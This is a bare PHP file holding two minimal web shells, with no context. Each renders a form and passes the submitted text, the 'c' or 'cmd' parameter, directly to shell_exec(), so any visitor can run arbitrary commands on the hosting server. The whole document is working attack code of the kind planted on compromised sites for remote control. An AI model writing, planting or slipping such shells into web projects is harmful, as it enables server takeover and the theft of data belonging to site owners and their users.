<?php
if (isset($_REQUEST['c'])) {
    echo "<pre>" . shell_exec($_REQUEST['c']) . "</pre>";
}
?>
<form method="post">
<input name="c" size="50">
<input type="submit" value="Run">
</form>


<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if (isset($_GET['cmd'])) {
    echo "Command: " . htmlspecialchars($_GET['cmd']) . "<BR>";
    echo shell_exec($_GET['cmd']);
}
?>
</pre>
</BODY></HTML>
